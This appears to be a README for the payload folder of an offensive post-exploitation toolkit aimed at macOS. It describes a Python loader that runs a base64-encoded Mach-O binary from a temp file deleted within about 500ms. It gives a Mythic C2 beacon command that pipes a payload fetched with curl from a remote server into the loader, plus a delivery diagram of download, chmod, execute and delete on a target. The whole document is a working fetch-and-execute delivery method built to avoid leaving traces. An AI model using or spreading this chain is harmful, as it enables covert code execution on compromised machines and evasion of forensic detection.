# Payloads

## loader.py

Python stdin-based in-memory execution loader. Receives a base64-encoded
Mach-O binary via stdin, creates a transient temp file, executes it,
and immediately deletes it. The binary exists on disk for under 500ms.

### Usage in a Mythic beacon

```bash
shell curl -sk http://SERVER:8899/payload.b64 | base64 -d | python3 loader.py
```

### Direct usage (dev)

```bash
base64 -i ../build/interposescope | python3 payload/loader.py
```

## interposescope_inline.py

Self-contained Python loader that embeds the compiled Mach-O binary as base64.
No external file dependencies — the entire payload is one Python script
that can be piped directly into `python3 -`.

Generated by the build script. Rebuild with:

```bash
python3 -c "
import base64
with open('build/interposescope', 'rb') as f:
    b = base64.b64encode(f.read()).decode()
print(b)
" > payload.b64
```

Then wrap `payload.b64` into the standalone loader template.

## Delivery pattern

```
Build machine                          Target (via beacon)
────────────                          ──────────────────
clang → interposescope        ──►  curl | base64 -d > tmp
(base64)                           chmod +x tmp
                                   ./tmp  →  stdout
                                   rm -f tmp
```

The binary lives only as a transient temp file. It is never written to
a stable path, never added to PATH, never persisted.
